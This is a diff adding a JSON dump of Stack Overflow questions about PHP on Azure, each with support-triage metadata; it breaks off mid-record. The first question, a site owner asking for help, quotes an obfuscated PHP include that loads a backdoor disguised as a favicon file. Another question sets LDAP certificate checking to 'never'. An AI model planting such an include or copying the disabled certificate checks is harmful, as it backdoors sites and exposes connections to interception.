@@ -1,0 +1,986 @@
+[
+    {
+        "IRT": "N/A",
+        "Migrated_to": null,
+        "accepted_answer_id": 0,
+        "active_date": "3/15/2017 6:21:22 PM",
+        "answer_count": 0,
+        "answers": null,
+        "body": "<p>I have wordpress website (latest version, also updated all plugins to latest version) running on Azure Centos 7 LAMP Server. Recently, I noticed that my server sending spam emails. When I checked this in detail, I found some malicious file was created on server. Also there were some posts with the title as ＂Hacked by xxxxx＂. </p>\n\n<p>Then I have stopped postfix server and routed contact form emails through sendgrid. Also scanned wordpress files using some antivirus plugins, deleted suspicious post and confirmed that there are no malicious files. But after one or two days, again same issue happening, injecting some malicious code to index.php, wp-config.php. </p>\n\n<p>Here is the code which injected to index.php, wp-config.php, wp-settings.php :</p>\n\n<blockquote>\n  <p>/<em>42be3</em>/</p>\n  \n  <p>@include ＂\\x2fva\\x72/w\\x77w/\\x68tm\\x6c/d\\x61fa\\x74er\\x2fbl\\x6fg/\\x77p-\\x63on\\x74en\\x74/u\\x70lo\\x61ds\\x2ffa\\x76ic\\x6fn_\\x6668\\x39cd\\x2eic\\x6f＂;</p>\n  \n  <p>/<em>42be3</em>/</p>\n</blockquote>\n\n<p>Also found the permissions were changing to 755 from 644 for wp-config.php and index.php</p>\n\n<p>My Current permissions are : </p>\n\n<blockquote>\n  <p>folder : 755 </p>\n  \n  <p>files : 644</p>\n</blockquote>\n\n<p>Here is the log from apache : </p>\n\n<blockquote>\n  <p>184.168.193.119 - - [15/Mar/2017:17:46:33 +0000] ＂POST /wp-content/themes/Avada/bbpress/title.php HTTP/1.0＂ 301 -</p>\n</blockquote>\n\n<p>if we delete the file  mentioned on log, there will be no issues. But after one or two days, they will create another file with random name in any of other folders.</p>\n\n<p>I have added malicious file code to my dropbox account. </p>\n\n<p>Here is the link  :</p>\n\n<blockquote>\n  <p><a href=＂https://www.dropbox.com/s/yql04vr6ltiy9oz/samplecode.txt?dl=0＂ rel=＂nofollow noreferrer＂>https://www.dropbox.com/s/yql04vr6ltiy9oz/samplecode.txt?dl=0</a></p>\n</blockquote>\n\n<p>What I have done to prevent this :</p>\n\n<ol>\n<li>changed admin username </li>\n<li>deleted readme.html</li>\n<li>disabled cron</li>\n<li>enabled htaccess for wp-login.php</li>\n<li>blocked suspicious IPs on network security group.</li>\n</ol>\n\n<p>Unfortunately, still new malicious files creating on server and generating emails. </p>\n\n<p>It would be great if anyone can help me on this.</p>\n\n<p>Thanks in advance</p>\n",
+        "bounty_amount": 0,
+        "bounty_closes_date": 0,
+        "closed_date": 0,
+        "closed_reason": null,
+        "comments": null,
+        "community_owned_date": 0,
+        "create_date": "3/15/2017 6:21:22 PM",
+        "creation_date": 0,
+        "down_vote_count": 0,
+        "favorite_count": 0,
+        "is_answered": false,
+        "last_activity_date": 0,
+        "last_edit_date": 0,
+        "link": "http://stackoverflow.com/questions/42817748/wordpress-injected-code",
+        "locked_date": 0,
+        "migrated_from": null,
+        "owner": null,
+        "protected_date": 0,
+        "quality": "",
+        "question_id": 42817748,
+        "score": 0,
+        "status": "OffTopic",
+        "support_alias": "v-aach",
+        "tags": [
+            "php;wordpress;apache;.htaccess;azure"
+        ],
+        "team": "Azure",
+        "team_options": [
+            {
+                "Team_id": null,
+                "Team_name": "Office Dev"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "TechNet"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Azure"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "UWP"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Power BI"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Dev Tools"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Windows IoT"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Dev Center"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "HockeyApp"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "PowerUsers"
+            }
+        ],
+        "title": "Wordpress Injected code",
+        "up_vote_count": 0,
+        "utdata": 0,
+        "view_count": 0
+    },
+    {
+        "IRT": "1135",
+        "Migrated_to": null,
+        "accepted_answer_id": 0,
+        "active_date": "3/14/2017 10:23:37 AM",
+        "answer_count": 0,
+        "answers": null,
+        "body": "<p>I＇m using php 7 to connect to active directory using LDAP. I need to create manually a file under: C:\\openLDAP\\sysconf\\ldap.conf and set TLS_REQCERT never. If I don＇t create this file ldap fails to connect.</p>\n\n<p>How can I deploy this to, for example, azure machine that not includes C: disk?</p>\n\n<p>Do you know a better aproach to solve this error?</p>\n\n<p>I tried this:\n<a href=＂http://stackoverflow.com/questions/3866406/need-help-ignoring-server-certificate-while-binding-to-ldap-server-using-php＂>Need help ignoring server certificate while binding to LDAP server using PHP</a></p>\n\n<pre><code>   putenv(＇LDAPTLS_REQCERT=never＇);\n</code></pre>\n\n<p>But it doesn＇t works.</p>\n",
+        "bounty_amount": 0,
+        "bounty_closes_date": 0,
+        "closed_date": 0,
+        "closed_reason": null,
+        "comments": null,
+        "community_owned_date": 0,
+        "create_date": "3/14/2017 10:04:42 AM",
+        "creation_date": 0,
+        "down_vote_count": 0,
+        "favorite_count": 0,
+        "is_answered": false,
+        "last_activity_date": 0,
+        "last_edit_date": 0,
+        "link": "http://stackoverflow.com/questions/42782920/deploy-php-with-ldap-conf",
+        "locked_date": 0,
+        "migrated_from": null,
+        "owner": null,
+        "protected_date": 0,
+        "quality": "",
+        "question_id": 42782920,
+        "score": 0,
+        "status": "Waiting On Customer",
+        "support_alias": "v-aach",
+        "tags": [
+            "php;azure;ldap;openldap;ldapconnection"
+        ],
+        "team": "Azure",
+        "team_options": [
+            {
+                "Team_id": null,
+                "Team_name": "Office Dev"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "TechNet"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Azure"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "UWP"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Power BI"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Dev Tools"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Windows IoT"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Dev Center"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "HockeyApp"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "PowerUsers"
+            }
+        ],
+        "title": "Deploy php with ldap.conf",
+        "up_vote_count": 0,
+        "utdata": 0,
+        "view_count": 0
+    },
+    {
+        "IRT": "87261",
+        "Migrated_to": null,
+        "accepted_answer_id": 0,
+        "active_date": "3/15/2017 3:38:34 AM",
+        "answer_count": 0,
+        "answers": null,
+        "body": "<p>I have created a very simple ionic application with a login and username so far. I am currently using Microsoft azure mobile services to host my application. However I don＇t know how to work with a php file and a server. I am a beginner with working with servers thank you in advance.</p>\n\n<p>PHP Code:</p>\n\n<pre><code>&lt;?php\ntry {\n    $conn = new PDO(＂microsoft azure connection string＂, ＂username＂, ＂password＂);\n    $conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n}\ncatch (PDOException $e) {\n    print(＂Error connecting to SQL Server.＂);\n    die(print_r($e));\n}\n\n?&gt;\n</code></pre>\n\n<p>login controller :</p>\n\n<pre><code> .controller(＇loginCtrl＇, [＇$scope＇, ＇$stateParams＇, // The following is the constructor function for this page＇s controller. See https://docs.angularjs.org/guide/controller\n    // You can include any angular dependencies as parameters for this function\n    // TIP: Access Route Parameters for your page via $stateParams.parameterName\n    function ($scope, $stateParams) {\n\n    $scope.User = {};\n    $scope.login = function() {\n    str=＂Dont know what to put here＂;\n                $http.get(str)\n                .success(function (response){  \n          }).error(function() {                         //if login failed\n                        var alertPopup = $ionicPopup.alert({\n                            title: ＇Login failed!＇,\n                            template: ＇Please check your credentials!＇\n                        });\n                });\n            };\n\n    }])\n</code></pre>\n\n<p>login html</p>\n\n<pre><code>&lt;ion-view title=＂Login＂ id=＂page6＂&gt;\n  &lt;ion-content padding=＂true＂ class=＂has-header＂&gt;\n    &lt;form id=＂login-form4＂ class=＂list＂&gt;\n      &lt;ion-list id=＂login-list2＂&gt;\n        &lt;label class=＂item item-input＂ id=＂login-input10＂&gt;\n          &lt;span class=＂input-label＂&gt;Username/Email&lt;/span&gt;\n          &lt;input type=＂text＂ ng-model=＂User.email＂ placeholder=＂＂&gt;\n        &lt;/label&gt;\n        &lt;label class=＂item item-input＂ id=＂login-input11＂&gt;\n          &lt;span class=＂input-label＂&gt;Password&lt;/span&gt;\n          &lt;input type=＂password＂ ng-model=＂User.password＂ placeholder=＂＂&gt;\n        &lt;/label&gt;\n      &lt;/ion-list&gt;\n      &lt;div class=＂spacer＂ style=＂height: 40px;＂&gt;&lt;/div&gt;\n      &lt;a id=＂login-button2＂ ng-click=＂login()＂ class=＂button button-positive  button-block＂&gt;Log in&lt;/a&gt;\n      &lt;a ui-sref=＂signup＂ id=＂login-button3＂ class=＂button button-positive  button-block button-clear＂&gt;Or create an account&lt;/a&gt;\n    &lt;/form&gt;\n  &lt;/ion-content&gt;\n&lt;/ion-view&gt;\n</code></pre>\n",
+        "bounty_amount": 0,
+        "bounty_closes_date": 0,
+        "closed_date": 0,
+        "closed_reason": null,
+        "comments": null,
+        "community_owned_date": 0,
+        "create_date": "3/12/2017 4:26:42 AM",
+        "creation_date": 0,
+        "down_vote_count": 0,
+        "favorite_count": 0,
+        "is_answered": false,
+        "last_activity_date": 0,
+        "last_edit_date": 0,
+        "link": "http://stackoverflow.com/questions/42743753/how-to-connect-azure-mobile-services-to-ionic-application",
+        "locked_date": 0,
+        "migrated_from": null,
+        "owner": null,
+        "protected_date": 0,
+        "quality": "",
+        "question_id": 42743753,
+        "score": 0,
+        "status": "Waiting On Customer",
+        "support_alias": "v-aach",
+        "tags": [
+            "javascript;php;html;azure;ionic-framework"
+        ],
+        "team": "Azure",
+        "team_options": [
+            {
+                "Team_id": null,
+                "Team_name": "Office Dev"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "TechNet"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Azure"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "UWP"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Power BI"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Dev Tools"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Windows IoT"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Dev Center"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "HockeyApp"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "PowerUsers"
+            }
+        ],
+        "title": "How to connect azure mobile services to ionic application",
+        "up_vote_count": 0,
+        "utdata": 116,
+        "view_count": 0
+    },
+    {
+        "IRT": "N/A",
+        "Migrated_to": null,
+        "accepted_answer_id": 0,
+        "active_date": "3/10/2017 8:45:15 AM",
+        "answer_count": 0,
+        "answers": null,
+        "body": "<p>I am currently trying to use the following php code for Azure Blob storage to modify the format of the files that I upload:</p>\n\n<pre><code>require_once ＇vendor/autoload.php＇;\nuse WindowsAzure\\Blob\\Models\\CreateBlobOptions;\n$options = new CreateBlobOptions();\n$options-&gt;setBlobContentType(＂image/jpeg＂);\n</code></pre>\n\n<p>I followed the documentation to include the Azure libraries (<a href=＂https://docs.microsoft.com/en-us/azure/storage/storage-php-how-to-use-blobs＂ rel=＂nofollow noreferrer＂>https://docs.microsoft.com/en-us/azure/storage/storage-php-how-to-use-blobs</a>).</p>\n\n<p>Yet, whenever I run my code the following error is thrown:</p>\n\n<pre><code>Fatal error: Uncaught Error: Class ＇WindowsAzure\\Blob\\Models\\CreateBlobOptions＇ not found in /Applications/MAMP/htdocs/pano_azure/upload.php:15\n</code></pre>\n\n<p>When I look into my files I cant see the folders ＂\\Blob\\Models\\＂ in the ＂WindowsAzure＂ folder either.</p>\n\n<p>Has anybody encountered similar problems?</p>\n\n<p>Thanks</p>\n",
+        "bounty_amount": 0,
+        "bounty_closes_date": 0,
+        "closed_date": 0,
+        "closed_reason": null,
+        "comments": null,
+        "community_owned_date": 0,
+        "create_date": "3/10/2017 8:45:15 AM",
+        "creation_date": 0,
+        "down_vote_count": 0,
+        "favorite_count": 0,
+        "is_answered": false,
+        "last_activity_date": 0,
+        "last_edit_date": 0,
+        "link": "http://stackoverflow.com/questions/42713935/cannot-access-createbloboptions-for-azure-blob-storage",
+        "locked_date": 0,
+        "migrated_from": null,
+        "owner": null,
+        "protected_date": 0,
+        "quality": "",
+        "question_id": 42713935,
+        "score": 0,
+        "status": "Self-Answered",
+        "support_alias": "v-aach",
+        "tags": [
+            "php;azure;format;blob;windows-azure-storage"
+        ],
+        "team": "Azure",
+        "team_options": [
+            {
+                "Team_id": null,
+                "Team_name": "Office Dev"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "TechNet"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Azure"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "UWP"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Power BI"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Dev Tools"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Windows IoT"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Dev Center"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "HockeyApp"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "PowerUsers"
+            }
+        ],
+        "title": "Cannot access CreateBlobOptions() for Azure Blob Storage",
+        "up_vote_count": 0,
+        "utdata": 0,
+        "view_count": 0
+    },
+    {
+        "IRT": "34721",
+        "Migrated_to": null,
+        "accepted_answer_id": 0,
+        "active_date": "3/10/2017 3:44:01 AM",
+        "answer_count": 0,
+        "answers": null,
+        "body": "<p>I am currently creating a .NET Core WebAPI secured with Azure AD. (Which is also giving me challenges <a href=＂http://stackoverflow.com/questions/42667486/service-to-service-authentication-using-azure-ad-and-webapi＂>see here</a> </p>\n\n<p>I want to call this API from a Wordpress website but need to do a headless service-to-service call. So I need to get an access_token from azure ad (using my active directory app) and send this as the Bearer token.</p>\n\n<p>I＇ve had a look around for PHP samples but nothing concrete has come up so far, so would be great to get some pointers or samples on this. </p>\n",
+        "bounty_amount": 0,
+        "bounty_closes_date": 0,
+        "closed_date": 0,
+        "closed_reason": null,
+        "comments": null,
+        "community_owned_date": 0,
+        "create_date": "3/9/2017 6:05:20 PM",
+        "creation_date": 0,
+        "down_vote_count": 0,
+        "favorite_count": 0,
+        "is_answered": false,
+        "last_activity_date": 0,
+        "last_edit_date": 0,
+        "link": "http://stackoverflow.com/questions/42702428/service-to-service-rest-call-from-wordpress-to-net-webapi-secured-with-azure-ad",
+        "locked_date": 0,
+        "migrated_from": null,
+        "owner": null,
+        "protected_date": 0,
+        "quality": "",
+        "question_id": 42702428,
+        "score": 0,
+        "status": "Waiting On Customer",
+        "support_alias": "v-guiliu",
+        "tags": [
+            "php;wordpress;azure;asp.net-web-api;active-directory"
+        ],
+        "team": "Azure",
+        "team_options": [
+            {
+                "Team_id": null,
+                "Team_name": "Office Dev"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "TechNet"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Azure"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "UWP"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Power BI"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Dev Tools"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Windows IoT"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Dev Center"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "HockeyApp"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "PowerUsers"
+            }
+        ],
+        "title": "Service to Service REST call from Wordpress to .NET WebAPI secured with Azure AD",
+        "up_vote_count": 0,
+        "utdata": 40,
+        "view_count": 0
+    },
+    {
+        "IRT": "464",
+        "Migrated_to": null,
+        "accepted_answer_id": 0,
+        "active_date": "3/9/2017 12:20:22 PM",
+        "answer_count": 0,
+        "answers": null,
+        "body": "<p><a href=＂https://i.stack.imgur.com/L62sD.png＂ rel=＂nofollow noreferrer＂><img src=＂https://i.stack.imgur.com/L62sD.png＂ alt=＂enter image description here＂></a></p>\n\n<p>i am following :\n<a href=＂https://github.com/sendgrid/sendgrid-php＂ rel=＂nofollow noreferrer＂>https://github.com/sendgrid/sendgrid-php</a></p>\n\n<p>there is no detail regarding how to get the environment variable from the shell to the php environment.</p>\n\n<p>Please help</p>\n",
+        "bounty_amount": 0,
+        "bounty_closes_date": 0,
+        "closed_date": 0,
+        "closed_reason": null,
+        "comments": null,
+        "community_owned_date": 0,
+        "create_date": "3/9/2017 11:05:27 AM",
+        "creation_date": 0,
+        "down_vote_count": 0,
+        "favorite_count": 0,
+        "is_answered": false,
+        "last_activity_date": 0,
+        "last_edit_date": 0,
+        "link": "http://stackoverflow.com/questions/42693710/how-to-update-development-environment-when-working-with-sendgrid-web-api-using-p",
+        "locked_date": 0,
+        "migrated_from": null,
+        "owner": null,
+        "protected_date": 0,
+        "quality": "",
+        "question_id": 42693710,
+        "score": 0,
+        "status": "Pending on Research",
+        "support_alias": "v-aach",
+        "tags": [
+            "php;azure;sendgrid-api-v3"
+        ],
+        "team": "Azure",
+        "team_options": [
+            {
+                "Team_id": null,
+                "Team_name": "Office Dev"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "TechNet"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Azure"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "UWP"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Power BI"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Dev Tools"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Windows IoT"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Dev Center"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "HockeyApp"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "PowerUsers"
+            }
+        ],
+        "title": "How to update development environment when working with SendGrid Web api using Php",
+        "up_vote_count": 0,
+        "utdata": 0,
+        "view_count": 0
+    },
+    {
+        "IRT": "82071",
+        "Migrated_to": null,
+        "accepted_answer_id": 0,
+        "active_date": "3/8/2017 8:00:37 AM",
+        "answer_count": 0,
+        "answers": null,
+        "body": "<p>I＇ve managed to get Imagick working on Azure WebApp, following @Saurabh Kumar manual <a href=＂http://techblog.saurabhkumar.com/2015/12/setting-up-imagemagick-for-php-on-azure.html＂ rel=＂nofollow noreferrer＂>http://techblog.saurabhkumar.com/2015/12/setting-up-imagemagick-for-php-on-azure.html</a> (replaced with relevant packages for php7), however once I enable Composer extension on the same App, Azure is loosing PATH for imagick. </p>\n\n<p><a href=＂https://blogs.msdn.microsoft.com/azureossds/2015/12/07/php-imagemagick-on-azure-web-apps/＂ rel=＂nofollow noreferrer＂>There is a comment on MS blog</a> suggesting to edit the Composer applicationHost.xdt instead of creating a new applicationHost.xdt file for Imagick, if there is Composer installed. \nI＇ve tried it but it crushed the whole app (HTTP Error 503).</p>\n\n<p>Is there a way to make both Imagick and Composer work on Azure WebApp? </p>\n",
+        "bounty_amount": 0,
+        "bounty_closes_date": 0,
+        "closed_date": 0,
+        "closed_reason": null,
+        "comments": null,
+        "community_owned_date": 0,
+        "create_date": "3/7/2017 7:53:30 AM",
+        "creation_date": 0,
+        "down_vote_count": 0,
+        "favorite_count": 0,
+        "is_answered": false,
+        "last_activity_date": 0,
+        "last_edit_date": 0,
+        "link": "http://stackoverflow.com/questions/42642983/configuring-imagick-on-azure-webapp-with-composer-enabled",
+        "locked_date": 0,
+        "migrated_from": null,
+        "owner": null,
+        "protected_date": 0,
+        "quality": "",
+        "question_id": 42642983,
+        "score": 0,
+        "status": "Answered",
+        "support_alias": "v-aach",
+        "tags": [
+            "php;azure;composer-php;imagick"
+        ],
+        "team": "Azure",
+        "team_options": [
+            {
+                "Team_id": null,
+                "Team_name": "Office Dev"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "TechNet"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Azure"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "UWP"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Power BI"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Dev Tools"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Windows IoT"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Dev Center"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "HockeyApp"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "PowerUsers"
+            }
+        ],
+        "title": "Configuring Imagick on Azure WebApp with Composer enabled",
+        "up_vote_count": 0,
+        "utdata": 229,
+        "view_count": 0
+    },
+    {
+        "IRT": "74742",
+        "Migrated_to": null,
+        "accepted_answer_id": 0,
+        "active_date": "3/7/2017 3:17:11 PM",
+        "answer_count": 0,
+        "answers": null,
+        "body": "<p>I am using SparkPost as my sending mail server. When the site was in my development server i have verified the sending domain by making a entry to the DNS from the WHM panel.</p>\n\n<p>Now i have deployed the website in Microsoft azure. There i have created a DNS Zone then followed same step for domain verification but it seems not be working fine here.</p>\n\n<ol>\n<li>Can i send email by using SparkPost without verifying sending\ndomain?</li>\n<li>If yes then how to verify it in Microsoft azure?</li>\n<li>How to setup DKIM/ Domain key in azure or publish SPF or DKIM DNS records for it?</li>\n</ol>\n",
+        "bounty_amount": 0,
+        "bounty_closes_date": 0,
+        "closed_date": 0,
+        "closed_reason": null,
+        "comments": null,
+        "community_owned_date": 0,
+        "create_date": "3/6/2017 12:48:18 PM",
+        "creation_date": 0,
+        "down_vote_count": 0,
+        "favorite_count": 0,
+        "is_answered": false,
+        "last_activity_date": 0,
+        "last_edit_date": 0,
+        "link": "http://stackoverflow.com/questions/42626075/how-to-verify-sending-domain-for-sparkpost-in-microsoft-azure",
+        "locked_date": 0,
+        "migrated_from": null,
+        "owner": null,
+        "protected_date": 0,
+        "quality": "",
+        "question_id": 42626075,
+        "score": 0,
+        "status": "Waiting On Customer",
+        "support_alias": "v-aach",
+        "tags": [
+            "php;azure;dns;sparkpost"
+        ],
+        "team": "Azure",
+        "team_options": [
+            {
+                "Team_id": null,
+                "Team_name": "Office Dev"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "TechNet"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Azure"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "UWP"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Power BI"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Dev Tools"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Windows IoT"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Dev Center"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "HockeyApp"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "PowerUsers"
+            }
+        ],
+        "title": "How to verify sending domain for sparkpost in microsoft azure?",
+        "up_vote_count": 0,
+        "utdata": 256,
+        "view_count": 0
+    },
+    {
+        "IRT": "244216",
+        "Migrated_to": null,
+        "accepted_answer_id": 0,
+        "active_date": "3/6/2017 5:18:03 AM",
+        "answer_count": 0,
+        "answers": null,
+        "body": "<p>i have been using Azure for all my hosting and databases etc. Lately Azure has taken out this MySQL in-app. Now i wanted to make a Magento website, but it was there in ＂web app＂ and now its gone. The problem is i have no idea how to connect the magento website to the mysql in-app?\nCan someone guide me as how should i fill this</p>\n\n<p><a href=＂https://i.stack.imgur.com/hfQlg.png＂ rel=＂nofollow noreferrer＂><img src=＂https://i.stack.imgur.com/hfQlg.png＂ alt=＂I need these info from where do i get them＂></a></p>\n\n<p>Any help will be highly appreciated. I just want to know how to connect Magento to the MySQL in-app</p>\n",
+        "bounty_amount": 0,
+        "bounty_closes_date": 0,
+        "closed_date": 0,
+        "closed_reason": null,
+        "comments": null,
+        "community_owned_date": 0,
+        "create_date": "3/3/2017 9:27:47 AM",
+        "creation_date": 0,
+        "down_vote_count": 0,
+        "favorite_count": 0,
+        "is_answered": false,
+        "last_activity_date": 0,
+        "last_edit_date": 0,
+        "link": "http://stackoverflow.com/questions/42575103/mysql-in-app-on-azure-for-magento",
+        "locked_date": 0,
+        "migrated_from": null,
+        "owner": null,
+        "protected_date": 0,
+        "quality": "",
+        "question_id": 42575103,
+        "score": 0,
+        "status": "Waiting On Customer",
+        "support_alias": "v-aach",
+        "tags": [
+            "php;mysql;azure;magento"
+        ],
+        "team": "Azure",
+        "team_options": [
+            {
+                "Team_id": null,
+                "Team_name": "Office Dev"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "TechNet"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Azure"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "UWP"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Power BI"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Dev Tools"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Windows IoT"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Dev Center"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "HockeyApp"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "PowerUsers"
+            }
+        ],
+        "title": "MySQL in-app on Azure for Magento",
+        "up_vote_count": 0,
+        "utdata": 127,
+        "view_count": 0
+    },
+    {
+        "IRT": "62144",
+        "Migrated_to": null,
+        "accepted_answer_id": 0,
+        "active_date": "3/2/2017 7:49:11 AM",
+        "answer_count": 0,
+        "answers": null,
+        "body": "<p>I am new to azure, so i just started with sending push notification by portal, i did below steps and i got fail to get notification in android device while i got success notification with Outtcome:{0 passed, 0 failed) like below picture.</p>\n\n<p><a href=＂https://i.stack.imgur.com/O6JRq.png＂ rel=＂nofollow noreferrer＂><img src=＂https://i.stack.imgur.com/O6JRq.png＂ alt=＂enter image description here＂></a></p>\n\n<p>i made a blank android app and by which i got server key that is perfectly working because i test it by <a href=＂http://pushtry.com/＂ rel=＂nofollow noreferrer＂>http://pushtry.com/</a> </p>\n\n<p>how can i solve my problem please can anyone help me....</p>\n",
+        "bounty_amount": 0,
+        "bounty_closes_date": 0,
+        "closed_date": 0,
+        "closed_reason": null,
+        "comments": null,
+        "community_owned_date": 0,
+        "create_date": "3/1/2017 2:33:27 PM",
+        "creation_date": 0,
+        "down_vote_count": 0,
+        "favorite_count": 0,
+        "is_answered": false,
+        "last_activity_date": 0,
+        "last_edit_date": 0,
+        "link": "http://stackoverflow.com/questions/42534422/how-to-send-azure-push-notification-by-portal-to-android",
+        "locked_date": 0,
+        "migrated_from": null,
+        "owner": null,
+        "protected_date": 0,
+        "quality": "",
+        "question_id": 42534422,
+        "score": 0,
+        "status": "Waiting On Customer",
+        "support_alias": "v-aach",
+        "tags": [
+            "azure;push-notification;azure-notificationhub"
+        ],
+        "team": "Azure",
+        "team_options": [
+            {
+                "Team_id": null,
+                "Team_name": "Office Dev"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "TechNet"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Azure"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "UWP"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Power BI"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Dev Tools"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Windows IoT"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Dev Center"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "HockeyApp"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "PowerUsers"
+            }
+        ],
+        "title": "How to send azure push notification by portal to Android?",
+        "up_vote_count": 0,
+        "utdata": 121,
+        "view_count": 0
+    },
+    {
+        "IRT": "55498",
+        "Migrated_to": null,
+        "accepted_answer_id": 0,
+        "active_date": "3/2/2017 5:15:45 AM",
+        "answer_count": 0,
+        "answers": null,
+        "body": "<p>I used <code>AWS SNS</code> to send notification on multiple devices, in <code>AWS SNS</code> i created some <code>Topics</code> and <code>Subscribe</code> <code>Endpoint ARN</code> (user device in AWS) to Topic and <code>Publish</code> notification on Topic to send notification to all subscribers by <code>PHP</code>.</p>\n\n<p>Now i am switching to Azure, and want to implement same application in <code>PHP</code>, after some research i find out this link:</p>\n\n<p><a href=＂https://docs.microsoft.com/en-us/azure/service-bus-messaging/service-bus-php-how-to-use-topics-subscriptions＂ rel=＂nofollow noreferrer＂>https://docs.microsoft.com/en-us/azure/service-bus-messaging/service-bus-php-how-to-use-topics-subscriptions</a></p>\n\n<p>Is there any way to implement my requirement without using <code>Service Bus</code>. Also dosen＇t understand Why Topic and Subscription are in <code>Service Bus</code> and unable to use it directly. Or is there some reason to use it via <code>Service Bus</code>.</p>\n",
+        "bounty_amount": 0,
+        "bounty_closes_date": 0,
+        "closed_date": 0,
+        "closed_reason": null,
+        "comments": null,
+        "community_owned_date": 0,
+        "create_date": "3/1/2017 11:59:13 AM",
+        "creation_date": 0,
+        "down_vote_count": 0,
+        "favorite_count": 0,
+        "is_answered": false,
+        "last_activity_date": 0,
+        "last_edit_date": 0,
+        "link": "http://stackoverflow.com/questions/42531157/azure-send-push-notification-to-multiple-devices-broadcast",
+        "locked_date": 0,
+        "migrated_from": null,
+        "owner": null,
+        "protected_date": 0,
+        "quality": "",
+        "question_id": 42531157,
+        "score": 0,
+        "status": "Waiting On Customer",
+        "support_alias": "v-aach",
+        "tags": [
+            "php;azure;push-notification"
+        ],
+        "team": "Azure",
+        "team_options": [
+            {
+                "Team_id": null,
+                "Team_name": "Office Dev"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "TechNet"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Azure"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "UWP"
+            },
+            {
+                "Team_id": null,
+                "Team_name": "Power BI"
+            },
+            {
